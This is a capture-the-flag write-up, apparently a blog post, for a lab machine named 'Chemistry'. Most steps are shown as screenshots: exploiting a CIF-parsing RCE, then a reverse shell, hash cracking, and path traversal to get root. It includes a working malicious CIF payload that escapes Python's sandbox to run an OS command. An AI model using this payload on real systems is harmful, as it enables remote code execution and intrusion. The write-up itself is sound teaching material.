@@ -1,0 +1,138 @@
+---
+layout: post
+title: "Chemistry 126b9525529180abbe29ee9458c62b1e"
+date:   2025-07-14 12:05:57 -0400
+categories: writeups
+---
+
+# Chemistry
+
+# 1. Enumeration
+
+Start enumeration ports
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image.png' | relative_url }})
+
+There is a web application where you can upload CIF (Crystallographic Information File) format first at all we register ourselves 
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_1.png' | relative_url }})
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_2.png' | relative_url }})
+
+# 2. User flag
+
+We start trying some SSTI because of the nature of the service and the server running on it
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_3.png' | relative_url }})
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_4.png' | relative_url }})
+
+We haven’t got success, other option is a public cve, we search server side template injection in python but in this case we found only  a RCE CVE related to a python using CIFs files
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_5.png' | relative_url }})
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_6.png' | relative_url }})
+
+Follow the format and check the RCE
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_7.png' | relative_url }})
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_8.png' | relative_url }})
+
+```python
+#File header
+data_5yOhtAoR
+_audit_creation_date 2024-06-08
+_audit_creation_method "Exploiting CIF"
+
+#Defining an array
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+#Injecting code
+_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ()'.__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system (ping x.x.x.x);,0,0'
+
+#Aparenting a valid format
+_space_group_magn.number_BNS 6.2
+_space_group.magn.name_BNS "P n' m a' "
+```
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_9.png' | relative_url }})
+
+That is right the, out target is vulnerable
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_10.png' | relative_url }})
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_11.png' | relative_url }})
+
+Now is time to set a reverse shell
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_12.png' | relative_url }})
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_13.png' | relative_url }})
+
+Got shell as app user
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_14.png' | relative_url }})
+
+Searching into a .db file we found a MD5 hash
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_15.png' | relative_url }})
+
+Crack it
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_16.png' | relative_url }})
+
+Get the user flag
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_17.png' | relative_url }})
+
+# 3.Priv esc
+
+Use netstat for getting ports opened locally, there is one called http-alt
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_18.png' | relative_url }})
+
+It used to be the 8080 one and it’s used for web applications
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_19.png' | relative_url }})
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_20.png' | relative_url }})
+
+Forward it using ssh
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_21.png' | relative_url }})
+
+There is a graphical interface of a service management but we just can list services, other functionalities are not available, we also tested for path-traversal trying to leverage bad configuration in the list-service endpoint but nothing happened
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_22.png' | relative_url }})
+
+We have another endpoint 
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_23.png' | relative_url }})
+
+But it is forbidden
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_24.png' | relative_url }})
+
+We can note that if we try to follow another path the status code changes to not found, probably it is vulnerable to path-traversal
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_25.png' | relative_url }})
+
+We can include local files successfully to the request
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_26.png' | relative_url }})
+
+Get the flag
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_27.png' | relative_url }})
+
+We also can get the private key and start a ssh session as root
+
+The vulnerability here lies in the fact that the app.py file is mapping the access endpoint to the `static/` directory, where there are resources, but it is no checking the user input, this doesn’t happen in /listservices endpoint because it is only accessing processes on the machine through list_services function, the hole is open when we don’t access processes and start access to resources without sanitizing the request.
+
+![image.png]({{ '/assets/images/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c/733723af-1ca1-47c6-8c50-363bdc9f5104-export-563f3f6c-0c2c-44e3-a4ac-490bd58f899c_image_28.png' | relative_url }})
+
+Machine pwned!!!
